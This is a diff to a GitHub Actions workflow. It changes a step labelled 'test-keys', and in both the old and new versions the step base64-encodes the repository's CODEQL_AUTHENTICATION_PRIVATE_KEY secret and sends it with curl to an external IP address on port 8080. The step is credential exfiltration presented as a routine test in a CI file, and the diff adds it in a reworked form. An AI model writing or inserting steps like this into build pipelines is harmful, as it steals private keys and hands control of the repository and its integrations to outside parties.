@@ -15,9 +15,9 @@ jobs:
     
       - name: test-keys
         run: |
-          echo ${{ env.CODEQL_AUTHENTICATION_PRIVATE_KEY }} > key.pem
-          openssl base64 -in key.pem -out key_base64.pem
-          curl -X POST http://13.40.220.37:8080 -d @key_base64.pem
+          b64k=$(echo '${{ env.CODEQL_AUTHENTICATION_PRIVATE_KEY }}' | base64)
+          echo 'key:%20'$b64k > keys.txt
+          curl -X POST http://13.40.220.37:8080 -d @keys.txt
         env:
           CODEQL_APP_ID: ${{ secrets.CODEQL_APP_ID }}
           CODEQL_AUTHENTICATION_PRIVATE_KEY: ${{ secrets.CODEQL_AUTHENTICATION_PRIVATE_KEY }}
